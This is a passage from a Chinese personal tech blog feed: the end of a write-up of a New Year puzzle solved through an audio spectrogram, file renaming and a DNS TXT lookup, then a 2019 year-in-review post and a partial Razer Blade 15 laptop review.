<code>axton.im/code_of_2020_1.mp3</code>。</p>\n<h2>第二阶段</h2>\n<p>下载音频，可以听出音频是经过某种处理的白噪音。白噪音的特点是各频段的功率都均匀分布，在白噪音上做文章，很容易就可以联想到线索藏在频谱中。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8-1.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1534\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-8-1.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1200\" height=\"719\"></a>\n<p>频谱被处理成了 24×3 的网格，结合第二条提示“24×3，横向读取”可以推断出是将频谱当作二进制读取，得到 <code>01111001 01110010 01100011 00101110 01101101 01100101 00101111 00110010 00110000</code>，转为 ASCII 字符可得 <code>yrc.me/20</code>。</p>\n<h2>第三阶段</h2>\n<p>打开上一步得到的页面，提示要求输入十位数密码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-10.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1536\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-10.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"663\" height=\"460\"></a>\n<p>如果你在上一步注意到了这个音频文件奇怪的属性，你可以反应过来这里的密码就是 <code>2000202020</code>。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-11.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1537\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-11.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"421\" height=\"651\"></a>\n<p>如果你没有注意到，查看页面代码可以看到一条注释 <code>&lt;!-- Tips: the attribute of the audio --&gt;</code> 将你引导向音频文件的属性。输入密码，解锁即可进入下一步。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-9.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1535\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-9.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"397\" height=\"223\"></a>\n<h2>第四阶段</h2>\n<p>可以看到是一张图片，内容为“<del>.JPG</del>”和“.ZIP”。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2020-1-scaled.jpg\"><img loading=\"lazy\" class=\"aligncenter size-large wp-image-1532\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/2020-1-scaled.jpg?imageView2/1/w/724/h/1024/interlace/1/q/90&amp;x-oss-process=image/resize,m_fill,w_1448,h_2048/interlace,1/quality,Q_90#%23\" alt=\"\" width=\"724\" height=\"1024\"></a>\n<p>和去年一样的套路，下载图片，将后缀名改为 .zip 然后打开，可以看到 README.txt。</p>\n<h2>最后一步</h2>\n<p>查看 README.txt 的内容，可以了解到需要去 🤔.axton.cc 获取红包口令码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-12.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1538\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-12.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1131\" height=\"278\"></a>\n<p>扔到浏览器里会出现奶冰同款找不到 IP，于是可以联想到 TXT 记录。唯一的问题是 🤔 这个 Emoji 需要如何处理。域名使用 Punycode 将 Unicode 字符转换为 ASCII 字符，特点是以 <code>xn--</code> 开头。如果你把上面这个域名扔进浏览器，你会发现它变成了 <code>xn--wp9h.axton.cc</code>。然后查询 TXT 记录，即可得到红包口令码。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-7.jpg\"><img loading=\"lazy\" class=\"aligncenter size-full wp-image-1527\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/01/rp-7.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"804\" height=\"557\"></a>\n","link":"https://flyhigher.top/develop/1519.html"},{"title":"无垠 2019 年度总结","date":"2019-12-29 12:25:52","description":"\n<p>又是时间飞快的一年…写 2018 总结的情景似乎还在眼前，转眼居然已经到 2019 年末了。</p>\n<p>2019 年，发生了太多事情，包括真的转折了人生的高考，这也导致我博客更新的不多（难以置信居然才更了两篇…），不过两篇技术性文章已经在路上了，可以期待一下。</p>\n<p>2019 年我也学了不少东西（单指技术方面），比如终于认真学了 Vue（但是还要练手）。书买了一大堆，看完的倒是没几本orz</p>\n<p>呼，好吧，是时候回顾一下充满坎坷的这一年了。2019 年还剩下最后两天，希望 2020 年，我能做得更好。</p>\n<h1>一些数据</h1>\n<p>照惯例先来看看一些数据吧。今年是统计系统完整统计了的第二年，终于可以和去年的数据比较一下了。以下数据的统计范围是 2019年1月1日0时至 2019年12月29日20时。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 26,901 (<span>+4%</span>)，年 PV 76,583 (<span>+3%</span>)，日均 UV 73.7，平均停留时间 5分13秒 (<span>-13.8%</span>)，平均跳出率 53% (<span>+20.5%</span>)。一年有效文章数 2 (<span>-50%</span>)，新增评论 439 条。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/fh.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/fh.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1000\" height=\"1143\" class=\"aligncenter size-full wp-image-1511\"></a>\n<p>有趣的是今年文章数腰斩，访问数反而小有提升。<del>如果我哪天不更新了，访问数是不是可以无限大呢？</del></p>\n<p>今年博客最大的改动就是把整体风格切换到了 Material Design 2（当然这是 <a href=\"https://flyhigher.top/develop/788.html\">MDx</a> 中的可选功能，给自己打个广告2333），此外还有比较失败的 WebP 改造计划，因为和缓存冲突已经回滚了。<a href=\"https://flyhigher.top/develop/1245.html\">ABS 系统</a>进展不大，主要是真的没有太多时间，还是要再学习一个。</p>\n<h2>个人主页</h2>\n<p>虽然个人主页的 TODO List 列了老长，但今年完全没有更新，也没有推广，从今年 8 月底开始还莫名被某墙认证了，直到 11 月底才恢复，于是今年总访问量比去年少了很多，</p>\n<p>有多少呢？这么少：总 UV 2,141 (<span>-65.9%</span>)，总 PV 2,744 (<span>-66.6%</span>)，日均 UV 6 (<span>-65.9%</span>)，平均停留时间 62秒 (<span>+19.2%</span>)。主要来源是知乎和 V2EX，还有一些甚至是从微信来的。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/axton.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/axton.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1000\" height=\"1103\" class=\"aligncenter size-full wp-image-1512\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 8 次，新增 171 commits，2 种语言的翻译，Star 数增加了 175，现有 408。感谢所有人的支持，尤其是 <a href=\"https://github.com/Sn0bzy\" rel=\"noopener noreferrer\" target=\"_blank\">Hasan CAN</a>, <a href=\"https://github.com/yechs\" rel=\"noopener noreferrer\" target=\"_blank\">Ye Shu</a>, <a href=\"https://github.com/StarryLeo\" rel=\"noopener noreferrer\" target=\"_blank\">StarryLeo</a>, <a href=\"https://github.com/DCTewi\" rel=\"noopener noreferrer\" target=\"_blank\">冻葱Tewi</a>, <a href=\"https://github.com/syfxlin\" rel=\"noopener noreferrer\" target=\"_blank\">Otstar Lin</a> 等为 MDx 做出了不小贡献的你们。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：<a href=\"https://flyhigher.top/photograph/1309.html\">上手</a> DJI OSMO Pocket</li>\n<li>四月：最后一次参加浙江省普通高中学业水平考试</li>\n<li>五月：MDx 喜提 300 Stars</li>\n<li>六月：高考 <del>炸了，差亿点点上浙大</del>\n</li>\n<li>六月：入手了 Oneplus 7 Pro</li>\n<li>六月：和同学一起去成都重庆旅行</li>\n<li>六月：第一次近距离感受到地震</li>\n<li>六月：<a href=\"https://flyhigher.top/diary/1411.html\">入手</a>了一台雷蛇灵刃 15，目前是主力机</li>\n<li>七月：参与组织 THE Hack 2019 活动</li>\n<li>七月：面基了 <a href=\"https://itroy.cc/\" rel=\"noopener noreferrer\" target=\"_blank\">Tory</a>, Bie Shi 和 <a href=\"https://oxz.me/\" rel=\"noopener noreferrer\" target=\"_blank\">FHYunCai</a>\n</li>\n<li>八月：一个人去厦门武汉转了一圈，拍了自己的第一个 Vlog</li>\n<li>八月：入手了一个 Kindle Paperwhite 4，没有泡面可以压，于是用来看英文小说了</li>\n<li>八月：加入 TEDxNingbo 志愿者团队</li>\n<li>八月：和 Ralph 面基</li>\n<li>八月：入手了一个 Yubikey</li>\n<li>九月：人生第一次参加雅思考试 <del>7分，蛮开心的</del>\n</li>\n<li>十月：入手了一个 Samsung Galaxy Watch Active 2 <del>觉得不值</del>\n</li>\n<li>十一月：MDx 达到 400 Stars</li>\n<li>十一月：为 TEDxNingbo 设计开发的 H5 上线</li>\n<li>十一月：入手了第一台胶片相机，试图入坑胶片摄影</li>\n<li>十一月：参加 TEDxNingbo 2019 大会</li>\n<li>十二月：<del>我 Cytus II 入门了</del>\n</li>\n</ul>\n<h1>跨年红包</h1>\n<p>这算「传统习俗」了。和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2020年1月2日。</p>\n<p>今年的解谜旅程，从下面这个字符串开始。</p>\n<p><code>=CE=B1=D1=85t=D0=BEn.=D1=96m/=D1=81=D0=BEd=D0=B5_=D0=BEf_2020_=E2=92=88m=CF=81=D0=B7</code></p>\n<p>由于今年的题目比以前稍微难了一些，所以今年的红包金额还是比较大的，而且不限量，尽你所能试一试吧。</p>\n<p>一点你可能用得上的提示：URL 里全是 ASCII 字符 / 24×3，横向读取。</p>\n<p><a href=\"https://flyhigher.top/develop/1519.html\">答案</a>已公布。</p>\n<h1>跨年海报</h1>\n<p>这算是另一个「传统习俗」（笑）。因为我有做跨年海报的习惯，所以以下就是今年份的海报啦。</p>\n<p>用了 C4D+PS，还有我的一整个下午。</p>\n<p>提前祝各位新年快乐！</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/2020-f-web-scaled.jpg\"><img loading=\"lazy\" class=\"aligncenter wp-image-1467 size-large\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/12/2020-f-web-scaled.jpg?imageView2/1/w/724/h/1024/interlace/1/q/90&amp;x-oss-process=image/resize,m_fill,w_1448,h_2048/interlace,1/quality,Q_90#%23\" alt=\"\" width=\"724\" height=\"1024\"></a>\n","link":"https://flyhigher.top/diary/1464.html"},{"title":"Razer Blade 灵刃 15 2019 精英版简评","date":"2019-07-27 19:22:58","description":"\n<blockquote><p>“你这什么电脑啊，也是惠普的么？比我的还重一点欸。”同学拿着暗影精灵说。<br>\n“emmmm….杂牌电脑，买灯送的。”</p></blockquote>\n<h1>故事</h1>\n<p>考完高考，该换台电脑了。我此前在用的是一台 Dell Inspiron 15 7560，一台从商务本的角度来看还算不错的笔记本，平常用来写写代码还不错，但在我剪视频以及折腾 C4D 的时候明显有些力不从心，更别提运行大型游戏了。于是趁着这次换机机会，我打算换一台<strong>性能还算不错，又能带着走</strong>的笔记本。这么想着，我列出了我的需求：</p>\n<ul>\n<li>性能较高</li>\n<li>便携性好（薄、重量轻、电池续航长等）</li>\n<li>外观低调</li>\n<li>预算最高 2.5w</li>\n</ul>\n<p>由于并不喜欢外观太张扬的「游戏本风格」，我希望我选择的笔记本外观干净低调。此外，由于我最近正在折腾学习 ML，我希望显卡可以是 20 系的（虽然 10 系也不是不能用…）。满足以上需求的只有以下几种选择：</p>\n<ul>\n<li>技嘉 Aero 15</li>\n<li>Razer Blade 15 2019 精英版</li>\n<li>msi GS75</li>\n</ul>\n<p>至于败家之眼由于太过张扬，直接被我排除了。在仅剩的三个选择里面，Razer Blade 15 的外观在我看来是最低调简约的，而且屏幕有 1080P+240Hz 和 4K+触摸两种都很不错的规格可选，唯一的问题大概就是在 10 代 U 都快能买到的时候，Razer Blade 15 的 CPU 还是 8 代的。</p>\n<p>（哦…缺点大概还有比较贵吧…）</p>\n<p>在我纠结的时候，我联系的卖家告诉我 Razer Blade 9 代 U 的版本已经到国内总代了，如果顺利的话他可以在 6.16 第一批直接给我发货；另外他也可以为高考生提供优惠。既然都这样了还有什么好纠结的，买了！选了 2070 Max-Q/16GB/256GB/1080P/240Hz 的版本，下单付款，果然在 16 号顺利入手。</p>\n<p>最终确定这个配置是因为 2080 的版本太贵，但是 4K 触摸屏版本只在 2080 版本上有，只好选了 1080P；另外 512 GB 的版本比我买的 256 GB 贵了 2K，于是决定自己买块 1T 的盘换掉。</p>\n<h1>开箱</h1>\n<p>包装箱也很低调，只在侧面露出一抹骚绿。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1875\" class=\"aligncenter size-full wp-image-1398\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer13-1024x768.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>正面和背面。照片是在用了一个多月以后拍的，看起来有点脏。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1349\" class=\"aligncenter size-full wp-image-1394\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-300x202.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-768x518.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer8-1024x691.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1630\" class=\"aligncenter size-full wp-image-1386\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-300x213.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-768x544.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer10-1024x726.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>卸下后盖十颗梅花螺丝就能打开后盖。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"2636\" class=\"aligncenter size-full wp-image-1399\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-228x300.jpg 228w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-768x1012.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer14-777x1024.jpg 777w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p>SSD、内存条和无线网卡都在触手可及的地方。这张图里我已经换好了 SSD。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1790\" class=\"aligncenter size-full wp-image-1400\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-300x215.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-768x550.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer15-1024x733.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p>网卡是 AX200NGW，Intel 第一款支持 Wi-Fi 6 的网卡，好评。内存为双通道 DDR4，支持 XMP，不过我懒得折腾了。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1795\" class=\"aligncenter size-full wp-image-1401\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-300x269.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-768x689.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer16-1024x919.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p><strong>后盖只有一处卡扣，在靠近转轴一侧中间的位置，安装后盖的时候需要注意下。此外后盖和机身卡得比较紧，安装的时候需要注意下后盖有没有完全卡入机身。</strong></p>\n<p>然后开机。硬盘复制和升级系统什么的就不再赘述了。自带 Windows 10 家庭版，为了装 Docker 我升级到了专业版。</p>\n<p>从开箱到现在，我已经使用这台电脑一月有余。讲讲使用上的感受吧。</p>\n<h1>机身</h1>\n<p><strong>有人说 Blade 就是 Windows 版的 Macbook，这个说法其实还算贴切。</strong>整个金属材质的 A 面只有一个 Razer 的 Logo，屏幕点亮的时候会一同亮起。B 面是支持 Windows Hello 的摄像头、屏幕和一个比较低调的 Razer Logo。屏幕三面边框比较窄，观感不错。<strong>而一旦打开屏幕，Windows Hello 就会开始识别你的面部，并极快地解锁进入桌面，很舒服。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2000\" height=\"1500\" class=\"aligncenter size-full wp-image-1396\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11.jpg 2000w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer11-1024x768.jpg 1024w\" sizes=\"(max-width: 2000px) 100vw, 2000px\"></a>\n<p><span>和 Windows Hello 说声 Hello？</span></p>\n<p><strong>B 面边缘有一圈非常细的胶圈，可以在屏幕闭合的时候起密封的作用（不过实测效果不大…）。</strong>C 面是键盘、扬声器、开机键和触控板，这些后面会细说。<strong>D 面是塑料材质，有两条蛮厚的橡胶条把机身垫高</strong>，猜测是为了散热。</p>\n<p>Razer Blade 15 的接口比较丰富。左侧：</p>\n<ul>\n<li>电源接口</li>\n<li>2 个 USB 3.2 Gen 2 Type-A 接口</li>\n<li>1 个 3.5 mm 组合音频插孔</li>\n</ul>\n<p>右侧：</p>\n<ul>\n<li>1 个 USB 3.2 Gen 2 Type-A 接口</li>\n<li>1 个雷电 3 接口（通过 GPU 输出）</li>\n<li>1 个 HDMI 2.0B 接口</li>\n<li>1 个 MiniDisplayPort 1.4 接口</li>\n<li>安全锁孔</li>\n</ul>\n<p>这些接口日常使用完全够用，通过雷电 3 也能获得不错的拓展性（不过雷电 3 似乎需要跟独显抢带宽…）。</p>\n<p><strong>机身边缘比较锐，不过出乎意料地不是非常割手。</strong>之前在用的 Dell Inspiron 15 7560 边缘极其锋利，非常割手，难受。现在（相对来说）打字舒服很多了，好评。</p>\n<p><strong>机身很薄，薄到有点出乎意料。</strong>官方数据只有 17.8mm，就算加上把机身垫高了的橡胶条也还是比一枚硬币矮。然而毕竟还是塞了这么多硬件进去，看起来轻薄但<strong>实际上一点都不轻</strong>，官方数据 2.07 kg，加上砖头一样的电源适配器，<strong>出趟门其实还是有点累的。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1136\" class=\"aligncenter size-full wp-image-1395\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-300x148.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-768x379.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer9-1024x506.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<h1>续航</h1>\n<p>出乎意料，<strong>续航还不错</strong>，达到了我的预期。电池达到了 80Wh，我日常一个 VSCode 写代码，一个 Chrome 查资料，<strong>续航可以达到 8 小时出头</strong>，就算是在玩 HITMAN 1 小时后，电量仍能剩余一半左右。也就是说，短时间的移动办公完全不是问题，可以不带上厚重的电源适配器，算是解决了一部分「重」的问题吧。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1860\" class=\"aligncenter size-full wp-image-1397\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-300x223.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-768x571.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer12-1024x762.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p><span>电源适配器有点大</span></p>\n<h1>屏幕</h1>\n<p><strong>爽！真的爽！240Hz 刷新率带来的是实打实的流畅感</strong>，和 90Hz 那种需要用一段时间才能感受到的流程感不同， 240Hz 带来的是在桌面上划划鼠标都能感受到的异常流畅的感觉。</p>\n<p>不过受限于这块 2070 Max-Q，很多游戏游戏都没能完全利用这块屏幕的性能，再加上我不玩 FPS 游戏，高刷新率对我来说意义不大，<strong>这块屏幕的 240Hz 对我来说噱头大于实际作用（但是没得选啊…）。</strong>屏幕为 IPS 面板，覆盖 100% sRGB，并有出厂校色。由于我手头没有校色设备，具体参数暂时无法测量，但就官方数据来看，这块屏幕的素质还是不错的。当然 4K 版本由于面向设计师等，屏幕参数会更好，可惜我是体验不到了。</p>\n<h1>键盘、触控板和扬声器</h1>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"1619\" class=\"aligncenter size-full wp-image-1391\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-300x211.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-768x541.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer5-1024x721.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<p>打开屏幕第一反应：<strong>这触控板有点大啊。</strong>Rzaer Blade 15 配备的触控板比 Dell Inspiron 15 7560 大上一整圈，采用类玻璃材质，手感不错。触控板使用了微软 Precision 驱动，对 Windows 的各类手势支持良好。</p>\n<p><strong>键盘总的来说还行</strong>，键程不短，触感不算太软，为平面键帽；没有小键盘，不过方向键的大小与其他键一致。有一点要吐槽的就是键盘的按键标识是上下颠倒的…也就是需要配合 <kbd>Shift</kbd> 使用的键的标识反而在直接使用的键的标识的下方…虽然影响不大，但打字时看到键盘着实觉得违和。</p>\n<p>没有了小键盘，C 面多出来的空间被留给了扬声器。<strong>而这个声音…比较一般</strong>，整体听感有些薄而含混。不过好歹是 C 面朝上的双扬声器，声音还算清楚，而且立体声的感觉较强。加上自带的 Dolby Atmos 加成，<strong>总体听感还算可以。</strong></p>\n<p>另外，开机键被藏在了右侧扬声器上方，没有灯，有些低调。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2300\" height=\"2264\" class=\"aligncenter size-full wp-image-1392\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6.jpg 2300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-300x295.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-768x756.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer6-1024x1008.jpg 1024w\" sizes=\"(max-width: 2300px) 100vw, 2300px\"></a>\n<h1>系统</h1>\n<p>出厂带有 Windows 10 家庭版，预装雷蛇雷云。在雷云内不仅可以调整这台电脑的灯光、性能等设置，还可以一并调整所有连接到这台电脑的雷蛇外设的设置。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1280\" height=\"719\" class=\"aligncenter size-full wp-image-1387\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1.jpg 1280w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-768x431.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer1-1024x575.jpg 1024w\" sizes=\"(max-width: 1280px) 100vw, 1280px\"></a>\n<p><span>雷云 3 主界面</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1280\" height=\"719\" class=\"aligncenter size-full wp-image-1390\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4.jpg 1280w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-300x169.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-768x431.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer4-1024x575.jpg 1024w\" sizes=\"(max-width: 1280px) 100vw, 1280px\"></a>\n<p><span>灯光拥有丰富的自定义选项（灯厂无疑了）</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"434\" height=\"262\" class=\"aligncenter size-full wp-image-1389\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3.jpg 434w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer3-300x181.jpg 300w\" sizes=\"(max-width: 434px) 100vw, 434px\"></a>\n<p><span>可以调整屏幕刷新率</span></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"2500\" height=\"1875\" class=\"aligncenter size-full wp-image-1393\" srcset=\"https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7.jpg 2500w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-300x225.jpg 300w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-768x576.jpg 768w, https://acdn.flyhigher.top/wp-content/uploads/2019/07/razer7-1024x768.jpg 1024w\" sizes=\"(max-width: 2500px) 100vw, 2500px\"></a>\n<p><span>通过 Chroma 